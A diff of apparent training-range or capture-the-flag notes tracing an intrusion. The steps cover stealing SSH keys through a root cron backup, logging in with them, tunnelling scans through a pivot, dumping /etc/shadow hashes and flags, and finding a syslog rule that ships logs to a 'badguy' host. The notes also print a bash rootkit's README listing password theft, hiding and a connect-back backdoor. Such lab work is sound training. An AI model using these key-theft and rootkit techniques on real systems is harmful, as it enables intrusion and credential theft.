@@ -112,6 +112,24 @@ ff02::2 ip6-allrouters
 ff02::3 ip6-allhosts
 192.168.150.253 Donovian-Intranet
 
+; cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+*  *    * * *   root    tar -C /home/comrade/ -czf /tmp/backup.tar.gz .ssh/
+
 put linops ssh key on www-data in 
 -check for .ssh folder / delete and make new one
 
@@ -137,12 +155,13 @@ find / -iname *inventory* 2>/dev/null
 cat /usr/share/equip-inventory.txt
 decode from base64
 
+get creds for user comrade on .253 from tar file made in crontab (*  *    * * *   root    tar -C /home/comrade/ -czf /tmp/backup.tar.gz .ssh/)
+scp -P 11711 -r www-data@127.0.0.1:/tmp/backup.tar.gz ./28.100_comrade/
 
+unzip tar file
+tar -xvzf 28.100_comrade/backup.tar.gz -C ./28.100_comrade/
 
-
-
-
-
+ssh using stolen keys
 
 
 
@@ -155,7 +174,7 @@ move dynamic to new master socket
 ssh -S /tmp/T1 dummy -O forward -D 9050
 
 nmap identified intranet IP
-proxychains nmap 192.168.150.253 -T5 --script=http-enum
+proxychains nmap 192.168.150.253 -T5 --script=http-enum -p 1-10000
 
 Nmap scan report for 192.168.150.253
 Host is up (0.00051s latency).
@@ -163,131 +182,536 @@ Not shown: 998 closed ports
 PORT    STATE SERVICE
 80/tcp  open  http
 514/tcp open  shell
+3201/tcp open  cpq-tasksmart
+
+banner grab 
+proxychains ns 192.168.150.253 3201 
+ssh-2.0
 
 make socket for .253 ports
 ssh -S /tmp/T1 dummy -O forward -L 11713:192.168.150.253:80 -L 11714:192.168.150.253:514
 
+ssh into .253
+ssh -i ./28.100_comrade/.ssh/id_rsa comrade@127.0.0.1 -p 11715
 
--------------------------------
-cat /usr/share/doc/cloud-init/examples/cloud-config-ssh-keys.txt
+passwd.txt 
+>comrade::StudentMidwayPassword
 
-#cloud-config
+cat /etc/hosts
+127.0.0.1 localhost
 
-# add each entry to ~/.ssh/authorized_keys for the configured user or the
-# first user defined in the user definition directive.
-ssh_authorized_keys:
-  - ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAGEA3FSyQwBI6Z+nCSjUUk8EEAnnkhXlukKoUPND/RRClWz2s5TCzIkd3Ou5+Cyz71X0XmazM3l5WgeErvtIwQMyT1KjNoMhoJMrJnWqQPOt5Q8zWd9qG7PBl9+eiH5qV7NZ mykey@host
-  - ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA3I7VUf2l5gSn5uavROsc5HRDpZdQueUq5ozemNSj8T7enqKHOEaFoU2VoPgGEWC9RyzSQVeyD6s7APMcE82EtmW4skVEgEGSbDc1pvxzxtchBj78hJP6Cf5TCMFSXw+Fz5rF1dR23QDbN1mkHs7adr8GW4kSWqU7Q7NDwfIrJJtO7Hi42GyXtvEONHbiRPOe8stqUly7MvUoN+5kfjBM8Qqpfl2+FNhTYWpMfYdPUnE7u536WqzFmsaqJctz3gBxH9Ex7dFtrxR4qiqEr9Qtlu3xGn7Bw07/+i1D+ey3ONkZLN+LQ714cgj8fRS4Hj29SCmXp5Kt5/82cD/VN3NtHw== smoser@brickies
-
-# Send pre-generated SSH private keys to the server
-# If these are present, they will be written to /etc/ssh and
-# new random keys will not be generated
-#  in addition to 'rsa' and 'dsa' as shown below, 'ecdsa' is also supported
-ssh_keys:
-  rsa_private: |
-    -----BEGIN RSA PRIVATE KEY-----
-    MIIBxwIBAAJhAKD0YSHy73nUgysO13XsJmd4fHiFyQ+00R7VVu2iV9Qcon2LZS/x
-    1cydPZ4pQpfjEha6WxZ6o8ci/Ea/w0n+0HGPwaxlEG2Z9inNtj3pgFrYcRztfECb
-    1j6HCibZbAzYtwIBIwJgO8h72WjcmvcpZ8OvHSvTwAguO2TkR6mPgHsgSaKy6GJo
-    PUJnaZRWuba/HX0KGyhz19nPzLpzG5f0fYahlMJAyc13FV7K6kMBPXTRR6FxgHEg
-    L0MPC7cdqAwOVNcPY6A7AjEA1bNaIjOzFN2sfZX0j7OMhQuc4zP7r80zaGc5oy6W
-    p58hRAncFKEvnEq2CeL3vtuZAjEAwNBHpbNsBYTRPCHM7rZuG/iBtwp8Rxhc9I5w
-    ixvzMgi+HpGLWzUIBS+P/XhekIjPAjA285rVmEP+DR255Ls65QbgYhJmTzIXQ2T9
-    luLvcmFBC6l35Uc4gTgg4ALsmXLn71MCMGMpSWspEvuGInayTCL+vEjmNBT+FAdO
-    W7D4zCpI43jRS9U06JVOeSc9CDk2lwiA3wIwCTB/6uc8Cq85D9YqpM10FuHjKpnP
-    REPPOyrAspdeOAV+6VKRavstea7+2DZmSUgE
-    -----END RSA PRIVATE KEY-----
-
-  rsa_public: ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAGEAoPRhIfLvedSDKw7XdewmZ3h8eIXJD7TRHtVW7aJX1ByifYtlL/HVzJ09nilCl+MSFrpbFnqjxyL8Rr/DSf7QcY/BrGUQbZn2Kc22PemAWthxHO18QJvWPocKJtlsDNi3 smoser@localhost
-
-  dsa_private: |
-    -----BEGIN DSA PRIVATE KEY-----
-    MIIBuwIBAAKBgQDP2HLu7pTExL89USyM0264RCyWX/CMLmukxX0Jdbm29ax8FBJT
-    pLrO8TIXVY5rPAJm1dTHnpuyJhOvU9G7M8tPUABtzSJh4GVSHlwaCfycwcpLv9TX
-    DgWIpSj+6EiHCyaRlB1/CBp9RiaB+10QcFbm+lapuET+/Au6vSDp9IRtlQIVAIMR
-    8KucvUYbOEI+yv+5LW9u3z/BAoGBAI0q6JP+JvJmwZFaeCMMVxXUbqiSko/P1lsa
-    LNNBHZ5/8MOUIm8rB2FC6ziidfueJpqTMqeQmSAlEBCwnwreUnGfRrKoJpyPNENY
-    d15MG6N5J+z81sEcHFeprryZ+D3Ge9VjPq3Tf3NhKKwCDQ0240aPezbnjPeFm4mH
-    bYxxcZ9GAoGAXmLIFSQgiAPu459rCKxT46tHJtM0QfnNiEnQLbFluefZ/yiI4DI3
-    8UzTCOXLhUA7ybmZha+D/csj15Y9/BNFuO7unzVhikCQV9DTeXX46pG4s1o23JKC
-    /QaYWNMZ7kTRv+wWow9MhGiVdML4ZN4XnifuO5krqAybngIy66PMEoQCFEIsKKWv
-    99iziAH0KBMVbxy03Trz
-    -----END DSA PRIVATE KEY-----
-
-  dsa_public: ssh-dss AAAAB3NzaC1kc3MAAACBAM/Ycu7ulMTEvz1RLIzTbrhELJZf8Iwua6TFfQl1ubb1rHwUElOkus7xMhdVjms8AmbV1Meem7ImE69T0bszy09QAG3NImHgZVIeXBoJ/JzByku/1NcOBYilKP7oSIcLJpGUHX8IGn1GJoH7XRBwVub6Vqm4RP78C7q9IOn0hG2VAAAAFQCDEfCrnL1GGzhCPsr/uS1vbt8/wQAAAIEAjSrok/4m8mbBkVp4IwxXFdRuqJKSj8/WWxos00Ednn/ww5QibysHYULrOKJ1+54mmpMyp5CZICUQELCfCt5ScZ9GsqgmnI80Q1h3Xkwbo3kn7PzWwRwcV6muvJn4PcZ71WM+rdN/c2EorAINDTbjRo97NueM94WbiYdtjHFxn0YAAACAXmLIFSQgiAPu459rCKxT46tHJtM0QfnNiEnQLbFluefZ/yiI4DI38UzTCOXLhUA7ybmZha+D/csj15Y9/BNFuO7unzVhikCQV9DTeXX46pG4s1o23JKC/QaYWNMZ7kTRv+wWow9MhGiVdML4ZN4XnifuO5krqAybngIy66PMEoQ= smoser@localhost
+# The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+192.168.56.1   badguy
+#f1@g = 5Ye2iReJYFpXy8OQ9xKw
 
 
-#cloud-config
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+comrade:x:1001:1001::/home/comrade:/bin/bash
 
-# add each entry to ~/.ssh/authorized_keys for the configured user or the
-# first user defined in the user definition directive.
-ssh_authorized_keys:
-  - ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAGEA3FSyQwBI6Z+nCSjUUk8EEAnnkhXlukKoUPND/RRClWz2s5TCzIkd3Ou5+Cyz71X0XmazM3l5WgeErvtIwQMyT1KjNoMhoJMrJnWqQPOt5Q8zWd9qG7PBl9+eiH5qV7NZ mykey@host
-  - ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA3I7VUf2l5gSn5uavROsc5HRDpZdQueUq5ozemNSj8T7enqKHOEaFoU2VoPgGEWC9RyzSQVeyD6s7APMcE82EtmW4skVEgEGSbDc1pvxzxtchBj78hJP6Cf5TCMFSXw+Fz5rF1dR23QDbN1mkHs7adr8GW4kSWqU7Q7NDwfIrJJtO7Hi42GyXtvEONHbiRPOe8stqUly7MvUoN+5kfjBM8Qqpfl2+FNhTYWpMfYdPUnE7u536WqzFmsaqJctz3gBxH9Ex7dFtrxR4qiqEr9Qtlu3xGn7Bw07/+i1D+ey3ONkZLN+LQ714cgj8fRS4Hj29SCmXp5Kt5/82cD/VN3NtHw== smoser@brickies
-
-# Send pre-generated SSH private keys to the server
-# If these are present, they will be written to /etc/ssh and
-# new random keys will not be generated
-#  in addition to 'rsa' and 'dsa' as shown below, 'ecdsa' is also supported
-ssh_keys:
-  rsa_private: |
-    -----BEGIN RSA PRIVATE KEY-----
-    MIIBxwIBAAJhAKD0YSHy73nUgysO13XsJmd4fHiFyQ+00R7VVu2iV9Qcon2LZS/x
-    1cydPZ4pQpfjEha6WxZ6o8ci/Ea/w0n+0HGPwaxlEG2Z9inNtj3pgFrYcRztfECb
-    1j6HCibZbAzYtwIBIwJgO8h72WjcmvcpZ8OvHSvTwAguO2TkR6mPgHsgSaKy6GJo
-    PUJnaZRWuba/HX0KGyhz19nPzLpzG5f0fYahlMJAyc13FV7K6kMBPXTRR6FxgHEg
-    L0MPC7cdqAwOVNcPY6A7AjEA1bNaIjOzFN2sfZX0j7OMhQuc4zP7r80zaGc5oy6W
-    p58hRAncFKEvnEq2CeL3vtuZAjEAwNBHpbNsBYTRPCHM7rZuG/iBtwp8Rxhc9I5w
-    ixvzMgi+HpGLWzUIBS+P/XhekIjPAjA285rVmEP+DR255Ls65QbgYhJmTzIXQ2T9
-    luLvcmFBC6l35Uc4gTgg4ALsmXLn71MCMGMpSWspEvuGInayTCL+vEjmNBT+FAdO
-    W7D4zCpI43jRS9U06JVOeSc9CDk2lwiA3wIwCTB/6uc8Cq85D9YqpM10FuHjKpnP
-    REPPOyrAspdeOAV+6VKRavstea7+2DZmSUgE
-    -----END RSA PRIVATE KEY-----
-
-  rsa_public: ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAGEAoPRhIfLvedSDKw7XdewmZ3h8eIXJD7TRHtVW7aJX1ByifYtlL/HVzJ09nilCl+MSFrpbFnqjxyL8Rr/DSf7QcY/BrGUQbZn2Kc22PemAWthxHO18QJvWPocKJtlsDNi3 smoser@localhost
-
-  dsa_private: |
-    -----BEGIN DSA PRIVATE KEY-----
-    MIIBuwIBAAKBgQDP2HLu7pTExL89USyM0264RCyWX/CMLmukxX0Jdbm29ax8FBJT
-    pLrO8TIXVY5rPAJm1dTHnpuyJhOvU9G7M8tPUABtzSJh4GVSHlwaCfycwcpLv9TX
-    DgWIpSj+6EiHCyaRlB1/CBp9RiaB+10QcFbm+lapuET+/Au6vSDp9IRtlQIVAIMR
-    8KucvUYbOEI+yv+5LW9u3z/BAoGBAI0q6JP+JvJmwZFaeCMMVxXUbqiSko/P1lsa
-    LNNBHZ5/8MOUIm8rB2FC6ziidfueJpqTMqeQmSAlEBCwnwreUnGfRrKoJpyPNENY
-    d15MG6N5J+z81sEcHFeprryZ+D3Ge9VjPq3Tf3NhKKwCDQ0240aPezbnjPeFm4mH
-    bYxxcZ9GAoGAXmLIFSQgiAPu459rCKxT46tHJtM0QfnNiEnQLbFluefZ/yiI4DI3
-    8UzTCOXLhUA7ybmZha+D/csj15Y9/BNFuO7unzVhikCQV9DTeXX46pG4s1o23JKC
-    /QaYWNMZ7kTRv+wWow9MhGiVdML4ZN4XnifuO5krqAybngIy66PMEoQCFEIsKKWv
-    99iziAH0KBMVbxy03Trz
-    -----END DSA PRIVATE KEY-----
-
-  dsa_public: ssh-dss AAAAB3NzaC1kc3MAAACBAM/Ycu7ulMTEvz1RLIzTbrhELJZf8Iwua6TFfQl1ubb1rHwUElOkus7xMhdVjms8AmbV1Meem7ImE69T0bszy09QAG3NImHgZVIeXBoJ/JzByku/1NcOBYilKP7oSIcLJpGUHX8IGn1GJoH7XRBwVub6Vqm4RP78C7q9IOn0hG2VAAAAFQCDEfCrnL1GGzhCPsr/uS1vbt8/wQAAAIEAjSrok/4m8mbBkVp4IwxXFdRuqJKSj8/WWxos00Ednn/ww5QibysHYULrOKJ1+54mmpMyp5CZICUQELCfCt5ScZ9GsqgmnI80Q1h3Xkwbo3kn7PzWwRwcV6muvJn4PcZ71WM+rdN/c2EorAINDTbjRo97NueM94WbiYdtjHFxn0YAAACAXmLIFSQgiAPu459rCKxT46tHJtM0QfnNiEnQLbFluefZ/yiI4DI38UzTCOXLhUA7ybmZha+D/csj15Y9/BNFuO7unzVhikCQV9DTeXX46pG4s1o23JKC/QaYWNMZ7kTRv+wWow9MhGiVdML4ZN4XnifuO5krqAybngIy66PMEoQ= smoser@localhost
-
-
--------------------------------------------------------
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+cat /etc/shadow
+root:$6$V9apEU0x$cKDuPz59hBr48Qj6mnL0w5nuEddjzNEoHqfVY2pKs4VqqHqarZ1F9nCIaOsk7NvqIKrybd6OFFSnQXMjoT4aO1:19481:0:99999:7:::
+daemon:*:18325:0:99999:7:::
+bin:*:18325:0:99999:7:::
+sys:*:18325:0:99999:7:::
+sync:*:18325:0:99999:7:::
+games:*:18325:0:99999:7:::
+man:*:18325:0:99999:7:::
+lp:*:18325:0:99999:7:::
+mail:*:18325:0:99999:7:::
+news:*:18325:0:99999:7:::
+uucp:*:18325:0:99999:7:::
+proxy:*:18325:0:99999:7:::
+www-data:*:18325:0:99999:7:::
+backup:*:18325:0:99999:7:::
+list:*:18325:0:99999:7:::
+irc:*:18325:0:99999:7:::
+gnats:*:18325:0:99999:7:::
+nobody:*:18325:0:99999:7:::
+systemd-network:*:18325:0:99999:7:::
+systemd-resolve:*:18325:0:99999:7:::
+syslog:*:18325:0:99999:7:::
+messagebus:*:18325:0:99999:7:::
+_apt:*:18325:0:99999:7:::
+lxd:*:18325:0:99999:7:::
+uuidd:*:18325:0:99999:7:::
+dnsmasq:*:18325:0:99999:7:::
+landscape:*:18325:0:99999:7:::
+sshd:*:18325:0:99999:7:::
+pollinate:*:18325:0:99999:7:::
+ubuntu:!:19481:0:99999:7:::
+comrade:$6$TWu7qH0m$CX3CNvgib3ksGe6TxlHWjKiM3AE.Azur7lGtCU2QZJlBb2Do3YBjswJ0Zy2q9.xc2sJEofW38lJuGU1uLcInU1:19481:0:99999:7:::
+#F1aG = uMoZAH286atGACjhvUoL
 
 
+cat /etc/crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
 
 
+ss -ntlp
+State       Recv-Q       Send-Q                Local Address:Port               Peer Address:Port       
+LISTEN      0            128                       127.0.0.1:6010                    0.0.0.0:*          
+LISTEN      0            128                         0.0.0.0:3201                    0.0.0.0:*          
+LISTEN      0            25                          0.0.0.0:514                     0.0.0.0:*          
+LISTEN      0            128                         0.0.0.0:80                      0.0.0.0:*          
+LISTEN      0            128                   127.0.0.53%lo:53                      0.0.0.0:*          
+LISTEN      0            128                           [::1]:6010                       [::]:*          
+LISTEN      0            25                             [::]:514                        [::]:*
+
+systemctl --type=service
+accounts-daemon.service              loaded active running Accounts Service                          
+  apache2.service                      loaded active running The Apache HTTP Server                    
+  apparmor.service                     loaded active exited  AppArmor initialization                   
+  apport.service                       loaded active exited  LSB: automatic crash report generation    
+  atd.service                          loaded active running Deferred execution scheduler              
+  blk-availability.service             loaded active exited  Availability of block devices             
+● cloud-config.service                 loaded failed failed  Apply the settings specified in cloud-confi
+● cloud-final.service                  loaded failed failed  Execute cloud user/final scripts          
+● cloud-init-local.service             loaded failed failed  Initial cloud-init job (pre-networking)   
+● cloud-init.service                   loaded failed failed  Initial cloud-init job (metadata service cr
+  console-setup.service                loaded active exited  Set console font and keymap               
+  cron.service                         loaded active running Regular background program processing daemo
+  dbus.service                         loaded active running D-Bus System Message Bus                  
+  ebtables.service                     loaded active exited  ebtables ruleset management               
+  getty@tty1.service                   loaded active running Getty on tty1                             
+  grub-common.service                  loaded active exited  LSB: Record successful boot for GRUB      
+  keyboard-setup.service               loaded active exited  Set the console keyboard layout           
+  kmod-static-nodes.service            loaded active exited  Create list of required static device nodes
+  lvm2-lvmetad.service                 loaded active running LVM2 metadata daemon                      
+  lvm2-monitor.service                 loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. 
+  lxcfs.service                        loaded active running FUSE filesystem for LXC                   
+  lxd-containers.service               loaded active exited  LXD - container startup/shutdown          
+  networkd-dispatcher.service          loaded active running Dispatcher daemon for systemd-networkd    
+  polkit.service                       loaded active running Authorization Manager                     
+  rsyslog.service                      loaded active running System Logging Service                    
+  serial-getty@ttyS0.service           loaded active running Serial Getty on ttyS0                     
+  setvtrgb.service                     loaded active exited  Set console scheme                        
+  snapd.seeded.service                 loaded active exited  Wait until snapd is fully seeded          
+  ssh.service                          loaded active running OpenBSD Secure Shell server               
+  systemd-journal-flush.service        loaded active exited  Flush Journal to Persistent Storage       
+  systemd-journald.service             loaded active running Journal Service                           
+  systemd-logind.service               loaded active running Login Service                             
+  systemd-modules-load.service         loaded active exited  Load Kernel Modules                       
+  systemd-networkd-wait-online.service loaded active exited  Wait for Network to be Configured         
+  systemd-networkd.service             loaded active running Network Service                           
+  systemd-random-seed.service          loaded active exited  Load/Save Random Seed                     
+  systemd-remount-fs.service           loaded active exited  Remount Root and Kernel File Systems      
+  systemd-resolved.service             loaded active running Network Name Resolution                   
+  systemd-sysctl.service               loaded active exited  Apply Kernel Variables                    
+  systemd-timesyncd.service            loaded active running Network Time Synchronization              
+  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Device Nodes in /dev        
+  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Files and Directories     
+  systemd-udev-trigger.service         loaded active exited  udev Coldplug all Devices                 
+  systemd-udevd.service                loaded active running udev Kernel Device Manager                
+  systemd-update-utmp.service          loaded active exited  Update UTMP about System Boot/Shutdown    
+  systemd-user-sessions.service        loaded active exited  Permit User Sessions                      
+  ufw.service                          loaded active exited  Uncomplicated firewall                    
+  unattended-upgrades.service          loaded active running Unattended Upgrades Shutdown              
+
+
+find rsyslog.d
+ls /etc/rsyslog.d                                  /               ls /usr/share/rsyslog.d
+20-ufw.conf  21-cloudinit.conf  50-default.conf    /               50-default.conf
+      
+cat /etc/rsyslog.d/50-default.conf
+
+#  Default rules for rsyslog.
+#
+#			For more information see rsyslog.conf(5) and /etc/rsyslog.conf
+
+#
+# First some standard log files.  Log by facility.
+#
+auth,authpriv.*			/var/log/auth.log
+*.*;auth,authpriv.none		-/var/log/syslog
+#cron.*				/var/log/cron.log
+#daemon.*			-/var/log/daemon.log
+kern.*				-/var/log/kern.log
+#lpr.*				-/var/log/lpr.log
+mail.*				-/var/log/mail.log
+#user.*				-/var/log/user.log
+
+#
+# Logging for the mail system.  Split it up so that
+# it is easy to write scripts to parse these files.
+#
+#mail.info			-/var/log/mail.info
+#mail.warn			-/var/log/mail.warn
+mail.err			/var/log/mail.err
+
+#
+# Some "catch-all" log files.
+#
+#*.=debug;\
+#	auth,authpriv.none;\
+#	news.none;mail.none	-/var/log/debug
+#*.=info;*.=notice;*.=warn;\
+#	auth,authpriv.none;\
+#	cron,daemon.none;\
+#	mail,news.none		-/var/log/messages
+
+#
+# Emergencies are sent to everybody logged in.
+#
+*.emerg				:omusrmsg:*
+
+#
+# I like to have messages displayed on the console, but only on a virtual
+# console I usually leave idle.
+#
+#daemon,mail.*;\
+#	news.=crit;news.=err;news.=notice;\
+#	*.=debug;*.=info;\
+#	*.=notice;*.=warn	/dev/tty8
+*.*         @@badguy:514
+#f1ag = 9exICwgt7P0xZzyPW57G <-----------------------------------------------##################
+
+
+
+look in ubuntu home directory since it "permission denied"
+found authorized keys empty
+search authorized keys
+look at root authorized keys, also empty
+look inside root directory
+
+sudo ls -lisa /root
+total 32
+  3811 4 drwx------  6 root root 4096 May  4  2023 .
+     2 4 drwxr-xr-x 23 root root 4096 Jul  9 19:39 ..
+  3813 4 -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+259431 4 drwx------  2 root root 4096 May  4  2023 .cache
+259433 4 drwx------  3 root root 4096 May  4  2023 .gnupg
+  3812 4 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
+258055 4 drwx------  2 root root 4096 May  4  2023 .ssh
+
+look into brootkit
+sudo ls -lisa /root/brootkit/brootkit-master
+
+total 128
+258064  4 drwxr-xr-x 2 root root  4096 Sep 12  2017 .
+258062  4 drwxr-xr-x 3 root root  4096 May  4  2023 ..
+258065  4 -rwxr-xr-x 1 root root    74 Sep 12  2017 .bdrc
+258088  8 -rw-r--r-- 1 root root  5527 Sep 12  2017 README.md
+258089  4 -rwxr-xr-x 1 root root   963 Sep 12  2017 bashbd.sh
+258100  4 -rwxr-xr-x 1 root root    60 Sep 12  2017 bashnc.sh
+258101  4 -rwxr-xr-x 1 root root    70 Sep 12  2017 bashproxy.sh
+258102  4 -rwxr-xr-x 1 root root    72 Sep 12  2017 bashtn.sh
+258103  4 -rw-r--r-- 1 root root   241 Jul  9 19:40 br.conf
+258104  4 -rwxr-xr-x 1 root root    24 Sep 12  2017 brbomb.sh
+258105  4 -rwxr-xr-x 1 root root  1588 Sep 12  2017 brconfig.sh
+258106  4 -rwxr-xr-x 1 root root   795 Sep 12  2017 brdaemon.sh
+258107  8 -rwxr-xr-x 1 root root  7804 Sep 12  2017 brget.sh
+258108 12 -rw-r--r-- 1 root root 10552 Sep 12  2017 brootkit.sh
+258109  8 -rwxr-xr-x 1 root root  6922 Sep 12  2017 brscan.sh
+258110  4 -rw-r--r-- 1 root root   104 Sep 12  2017 brsh.conf
+258111  4 -rwxr-xr-x 1 root root  1213 Sep 12  2017 brshconfig.sh
+258112  4 -rwxr-xr-x 1 root root  1924 Sep 12  2017 brshinstall.sh
+258113  4 -rw-r--r-- 1 root root  3741 Sep 12  2017 brshrootkit.sh
+258114  4 -rw-r--r-- 1 root root    99 Sep 12  2017 cronbd.sh
+258115  4 -rwxr-xr-x 1 root root  3777 Sep 12  2017 install.sh
+258116  4 -rwxr-xr-x 1 root root   721 Sep 12  2017 sshcrack.exp
+258117 12 -rwxr-xr-x 1 root root  8272 Sep 12  2017 sshcrack.sh
+258118  4 -rwxr-xr-x 1 root root   223 Sep 12  2017 ubd.sh
+258119  4 -rwxr-xr-x 1 root root  3091 Sep 12  2017 uninstall.sh
+
+sudo cat /root/brootkit/brootkit-master/README.md
+
+######BROOTKIT
+    Lightweight rootkit implemented using bash shell scripts v0.10
+    
+    by wzt 2015   wzt.wzt@gmail.com
+    
+    If bash shell scripts can be designed for security tools like chkrootkit
+    or rkhunter, so too can it be implemented for a rootkit.
+
+######FEATURES
+    1. more hidable ability against admintrator or hids.
+    2. su passwd thief.
+    3. hide file and directories.
+    4. hide process.
+    5. hide network connections.
+    6. connect backdoor.
+    7. multi thread port scanner.
+    8. http download.
+    9. multi thread ssh passwd crack.
+
+######TARGET OS
+    1. centos
+    2. rhel
+    3. ubuntu
+    4. debian
+    5. fedora
+    6. freebsd
+
+######TODO
+    1. sudo thief support.
+
+######INSTALL
+
+    Linux distribution systems.
+
+    1. edit br.conf first                <--------------------------------#######################
+
+      brootkit config file.
+
+      #these ports will be hidden: port1,port2,...,portn.
+      HIDE_PORT               8080,8899
+      #these files will be hidden: file1,file2,...,filen.
+      HIDE_FILE               br.conf,bashbd.sh,brootkit,.bdrc,brdaemon
+      #these processes will be hidden: process1,process2,...,processn.
+      HIDE_PROC               bashbd,brootkit,pty.spawn,brdaemon
+      #the connect back host domain name or ip address.
+      REMOTE_HOST             localhost
+      #the connect back host port.
+      REMOTE_PORT             8080
+      #the connect backdoor base sleep time.
+      SLEEP_TIME              60
+
+    2. ./install.sh
+
+    3. multi thread port scanner.
+
+      [root@localhost brootkit]$ ./brscan.sh
+      ./brscan.sh <-p> [-n|-t|-o|-h] <remote_host>
+
+      option:
+      -p              ports, pattern: port1,port2,port3-port7,portn...
+      -n              thread num, default is 10
+      -t              timeout, default is 30s
+      -o              results write into log file, default is brscan.log
+      -h              help information.
+
+      exp:
+      ./brscan.sh -p 21,22,23-25,80,135-139,8080 -t 20 www.cloud-sec.org
+      ./brscan.sh -p 1-65525 -n 200 -t 20 www.cloud-sec.org
+
+      [root@localhost brootkit]# ./brscan.sh -p 21,22,23-25,80,135-139,8080 -t 5 -n 20 www.wooyun.org
+      host: www.wooyun.org | total ports: 10 | thread num: 10 timeout: 5 | logfile: brscan.log
+
+      thread<0    >           --              pid <57053>     -->     21
+      thread<1    >           --              pid <57054>     -->     22
+      thread<2    >           --              pid <57055>     -->     23
+      thread<3    >           --              pid <57056>     -->     24
+      thread<4    >           --              pid <57057>     -->     80
+      thread<5    >           --              pid <57058>     -->     135
+      thread<6    >           --              pid <57059>     -->     136
+      thread<7    >           --              pid <57060>     -->     137
+      thread<8    >           --              pid <57061>     -->     138
+      thread<9    >           --              pid <57070>     -->     8080
+
+      [>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]     10/10     6 s
+
+      www.wooyun.org: 80
+
+    4. multi thread ssh passwd crack.
+      [root@localhost brootkit]# ./sshcrack.sh
+      ./sshcrack.sh <-h host> <-u user> <-p passwd> [-t timeout] [-n threadnum] [-o logfile]
+
+      option:
+      -h              host name or host list file.
+      -u              user name or user list file.
+      -p              single passwd or passwd list file.
+      -t              connect timeout, defalut is 5s.
+      -n              thread num, default is 1.
+      -o              log file.
+      -v              display help information.
+
+      exp:
+
+      ./sshcrack.sh -h 192.168.215.148 -u wzt -p passwd.lst
+      ./sshcrack.sh -h 192.168.215.148 -u wzt -p passwd.lst -n 10 -t 2
+      ./sshcrack.sh -h 192.168.215.148 -u user.lst -p passwd.lst -n 10 -t 2
+      ./sshcrack.sh -h host.lst -u user.lst -p passwd.lst -n 10 -t 2
+
+      [root@localhost brootkit]# ./sshcrack.sh -h 192.168.215.148 -u wzt -p passwd.lst -n 6
+      host: 1 | users: 1 | passwd: 28 thread: 6 | timeout: 10 | logfile: sshcrack.log
+
